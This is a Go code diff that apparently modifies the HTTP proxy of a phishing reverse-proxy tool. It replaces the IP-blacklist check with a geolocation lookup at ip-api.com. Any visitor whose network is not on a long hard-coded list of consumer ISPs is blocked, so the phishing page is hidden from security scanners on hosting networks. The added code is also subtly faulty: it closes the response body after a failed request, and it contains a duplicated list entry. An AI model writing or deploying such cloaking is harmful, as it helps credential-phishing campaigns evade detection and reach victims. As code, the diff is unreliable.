@@ -15,6 +15,7 @@ import (
 	"crypto/sha256"
 	"crypto/tls"
 	"encoding/base64"
+	"encoding/json"
 	"fmt"
 	"html"
 	"io"
@@ -154,25 +155,36 @@ func NewHttpProxy(hostname string, port int, cfg *Config, crt_db *CertDb, db *da
 			if strings.Contains(from_ip, ":") {
 				from_ip = strings.Split(from_ip, ":")[0]
 			}
-			if p.cfg.GetBlacklistMode() != "off" {
-				if p.bl.IsBlacklisted(from_ip) {
-					if p.bl.IsVerbose() {
-						log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
-					}
-					return p.blockRequest(req)
-				}
-				if p.cfg.GetBlacklistMode() == "all" {
-					err := p.bl.AddIP(from_ip)
-					if p.bl.IsVerbose() {
-						if err != nil {
-							log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
-						} else {
-							log.Warning("blacklisted ip address: %s", from_ip)
-						}
-					}
+			resp, err := http.Get("http://ip-api.com/json/" + from_ip)
+			if err != nil {
+				fmt.Println("No response from request")
+			}
+			defer resp.Body.Close()
+			body, err := ioutil.ReadAll(resp.Body)
+			as1 := data{}
+			json.Unmarshal([]byte(string(body)), &as1)
+			asn := [131]string{"AS3215 Orange S.A.", "AS15557 Societe Francaise Du Radiotelephone - SFR SA", "AS5410 Bouygues Telecom SA", "AS12322 Free SAS", "AS749 DoD Network Information Center", "AS7018 AT&T Services, Inc.", "AS721 DoD Network Information Center", "AS7922 Comcast Cable Communications, LLC", "AS701 Verizon Business", "AS3356 Level 3 Parent, LLC", "AS174	Cogent Communications", "AS209 CenturyLink Communications, LLC", "AS7029 Windstream Communications LLC", "AS21928 T-Mobile USA, Inc.", "AS26599	TELEFÔNICA BRASIL S.A", "AS26615 TIM S/A", "AS28573	Claro NXT Telecomunicacoes Ltda", "AS7738 V tal", "AS4230	CLARO S.A.", "AS27699 TELEFÔNICA BRASIL S.A", "AS8167 V tal", "AS12389 PJSC Rostelecom", "AS8359 MTS PJSC", "AS12714 PJSC MegaFon", "AS31200 Novotelecom Ltd", "AS25513	PJSC Moscow city telephone network", "AS9829 National Internet Backbone", "AS55836 Reliance Jio Infocomm Limited", "AS45609	Bharti Airtel Ltd. AS for GPRS Service", "AS24560 Bharti Airtel Ltd., Telemedia Services", "AS9498 BHARTI Airtel Ltd.", "AS1221	Telstra Corporation Ltd", "AS4804 Microplex PTY LTD", "AS7545 TPG Telecom Limited", "AS2856	British Telecommunications PLC", "AS5089 Virgin Media Limited", "AS5607	Sky UK Limited", "AS786	Jisc Services Limited", "AS12576 EE Limited", "AS13285 TalkTalk Communications Limited", "AS3320 Deutsche Telekom AG", "AS31399	Mercedes-Benz Group AG", "AS3209 Vodafone GmbH", "AS4761 INDOSAT Internet Network Provider", "AS23693 PT. Telekomunikasi Selular", "AS5617 Orange Polska Spolka Akcyjna", "AS12741 Netia SA", "AS577 Bell Canada", "AS812 Rogers Communications Canada Inc.", "AS6327 Shaw Communications Inc.", "AS852 TELUS Communications Inc.", "AS5769	Videotron Telecom Ltee", "AS1136 KPN B.V.", "AS1103 SURF B.V.", "AS3269	Telecom Italia S.p.A.", "AS1267	WIND TRE S.P.A.", "AS30722 Vodafone Italia S.p.A.", "AS9050	ORANGE ROMANIA COMMUNICATION S.A", "AS8708 RCS & RDS SA", "AS3352 TELEFONICA DE ESPANA S.A.U.", "AS12479 Orange Espagne SA", "AS12430 VODAFONE ESPANA S.A.U.", "AS15704	XTRA TELECOM S.A.", "AS12338 Euskaltel S.A.", "AS7303 Telecom Argentina S.A.", "AS22927	Telefonica de Argentina", "AS3303 Swisscom (Schweiz) AG", "AS559 SWITCH", "AS3301 Telia Company AB", "AS1257 Tele2 Sverige AB", "AS44034 Hi3G Access AB", "AS9121 Turk Telekomunikasyon Anonim Sirketi", "AS47331 TTNet A.S.", "AS8717 A1 Bulgaria EAD", "AS8866 Vivacom Bulgaria EAD", "AS16637 MTN SA", "AS8447 A1 Telekom Austria AG", "AS8412 T-Mobile Austria GmbH", "AS5610 O2 Czech Republic, a.s.", "AS16019 Vodafone Czech Republic a.s.", "AS13036 T-Mobile Czech Republic a.s.", "AS4771	Spark New Zealand Trading Ltd.", "AS9500 One New Zealand Group Limited", "AS9790 Two Degrees Networks Limited", "AS9506	Singtel Fibre Broadband", "AS7470 TRUE INTERNET Co.,Ltd.", "AS45899	VNPT Corp", "AS8151	Uninet S.A. de C.V.", "AS13999 Mega Cable, S.A. de C.V.", "AS9299 Philippine Long Distance Telephone Company", "AS3292 TDC Holding A/S", "AS9158 Telenor A/S", "AS5432 Proximus NV", "AS6848 Telenet BVBA", "AS6085	Societe Internationale de Telecommunications Aeronautiques", "AS47377 Orange Belgium SA", "AS26611 COMUNICACIÓN CELULAR S.A. COMCEL S.A.", "AS3816 COLOMBIA TELECOMUNICACIONES S.A. ESP", "AS13489 EPM Telecomunicaciones S.A. E.S.P.", "AS10620 Telmex Colombia S.A.", "AS7418 TELEFÓNICA CHILE S.A.", "AS22047 VTR BANDA ANCHA S.A.", "AS6535 Telmex Servicios Empresariales S.A.", "AS2119 Telenor Norge AS", "AS2116 GLOBALCONNECT AS", "AS5619	TIETOEVRY NORWAY AS", "AS12400 Partner Communications Ltd.", "AS1680 Cellcom Fixed Line Communication L.P", "AS12578 SIA Tet", "AS20910 Baltcom SIA", "AS5483 Magyar Telekom plc.", "AS21334 Vodafone Hungary Ltd.", "AS1213 HEAnet", "AS5466 Eircom Limited", "AS15502	Vodafone Ireland Limited", "AS5603 Telekom Slovenije, d.d.", "AS2107 ARNES", "AS6799 Ote SA (Hellenic Telecommunications Organisation)", "AS3329 VODAFONE-PANAFON HELLENIC TELECOMMUNICATIONS COMPANY SA", "AS8926 Moldtelecom SA", "AS203214 Hulum Almustakbal Company for Communication Engineering and Services Ltd", "AS14522 Satnet", "AS27947	Telconet S.A", "AS8400 TELEKOM SRBIJA a.d.", "AS8400 TELEKOM SRBIJA a.d.", "AS3249 Telia Eesti AS", "AS5391 Hrvatski Telekom d.d.", "AS2860	NOS COMUNICACOES, S.A.", "AS3243 MEO - SERVICOS DE COMUNICACOES E MULTIMEDIA S.A.", "AS12353 Vodafone Portugal - Communicacoes Pessoais S.A.", "AS21246 IPKO Telecommunications LLC"}
 
-					return p.blockRequest(req)
+			var result bool = true
+			for _, x := range asn {
+				if x == as1.Fai {
+					result = false
+					break
 				}
+			}
+			if result == true {
+				log.Warning("blacklist: request from ip address '%s' was blocked", from_ip)
+				return p.blockRequest(req)
+			}
+			if p.cfg.GetBlacklistMode() == "all" {
+				err := p.bl.AddIP(from_ip)
+				if err != nil {
+					log.Error("failed to blacklist ip address: %s - %s", from_ip, err)
+				} else {
+					log.Warning("blacklisted ip address: %s", from_ip)
+				}
+
+				return p.blockRequest(req)
 			}
 
 			req_url := req.URL.Scheme + "://" + req.Host + req.URL.Path
